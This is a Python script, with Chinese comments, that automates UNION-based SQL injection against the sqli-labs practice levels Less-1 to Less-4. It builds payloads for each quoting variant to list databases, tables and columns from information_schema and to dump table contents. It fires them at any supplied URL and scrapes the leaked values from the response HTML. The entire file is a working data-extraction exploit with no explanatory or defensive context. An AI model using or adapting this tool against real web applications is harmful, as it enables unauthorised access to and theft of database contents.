import requests
import re

from bs4 import BeautifulSoup


class Less1_Less4(object):

    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c):

        if url[-1] == "/":
            self.url = url
        else:
            self.url = url + "/"   # 获取不同的变量名，放入到self 类中 

        self.level = level
        self.dbs = dbs
        self.tables = tables
        self.columns = columns
        self.schema = schema
        self.d = d
        self.t = t
        self.c = c


    def dbs_payload(self):
        All = {1:"?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+"}
        All[2] = "?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata --+"
        All[3] = "?id=-1') union select 1,group_concat(schema_name),3 from information_schema.schemata --+"   # 用来枚举数据[库]的payload
        All[4] = '?id=-1") union select 1,group_concat(schema_name),3 from information_schema.schemata --+'

        return All[self.level]

    def tables_payload(self):
        All = {1:"?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='"+self.d+"' --+"}
        All[2] = "?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='"+self.d+"' --+"    # 用来枚举数据库[表]的payload
        All[3] = "?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='"+self.d+"' --+"
        All[4] = '?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="'+self.d+'" --+'

        return All[self.level]

    def columns_payload(self):
        All = {1:"?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='"+self.t+"' --+"}
        All[2] = "?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='"+self.t+"' --+"   # 用来枚举数据库[列]的payload
        All[3] = "?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='"+self.t+"' --+"
        All[4] = '?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name="'+self.t+'" --+'

        return All[self.level]

    def data_payload(self):
        All = {1:"?id=-1' union select 1,group_concat("+self.c+"),3 from "+self.d+"."+self.t+" --+"}
        All[2] = "?id=-1 union select 1,group_concat("+self.c+"),3 from "+self.d+"."+self.t+" --+"
        All[3] = "?id=-1') union select 1,group_concat("+self.c+"),3 from "+self.d+"."+self.t+" --+" # 用来枚举所有的[数据]
        All[4] = '?id=-1") union select 1,group_concat('+self.c+'),3 from '+self.d+'.'+self.t+' --+'

        return All[self.level]

    def soup(self,text):

        soup = BeautifulSoup(text,"html5lib")
        strings = soup.find_all('font')[2].text        # 把获取到的文本进行筛选

        return strings.split("Your")[1].split(":")[1].split(",")

    def DBS(self):
        rep = requests.get(self.url+self.dbs_payload())  # 调用数据库 payload和筛选出数据库数据
        return self.soup(rep.text)

    def TABLES(self):
        rep = requests.get(self.url+self.tables_payload())  # 调用表的 payload和筛选出表的数据
        return self.soup(rep.text)

    def COLUMNS(self):
        rep = requests.get(self.url+self.columns_payload()) # 调用列的 payload和筛选出列的数据
        return self.soup(rep.text)

    def SCHEMA(self):
        rep = requests.get(self.url+self.data_payload()) # 调用获取数据的 payload和筛选出数据
        return self.soup(rep.text)

    def TYPE(self):

        if self.dbs:  # 如果枚举数据库被设置
            print(self.DBS())

        elif self.d != '' and self.tables: # 如果枚举表和数据库名被设置
            print(self.TABLES())

        elif self.t != '' and self.columns and self.d != '': # 如果枚举列,和数据表,和数据列被设置
            print(self.COLUMNS())

        elif self.c != '' and self.t != '' and self.d != '' and self.schema: # 如果数据表,数据库,数据列被设置
            print(self.SCHEMA())

        else:
            print("wrong options and bad type!")

    def Less_1(self):
        self.TYPE()

    def Less_2(self):
        self.TYPE()                     # 执行不同的level

    def Less_3(self):
        self.TYPE()

    def Less_4(self):
        self.TYPE()

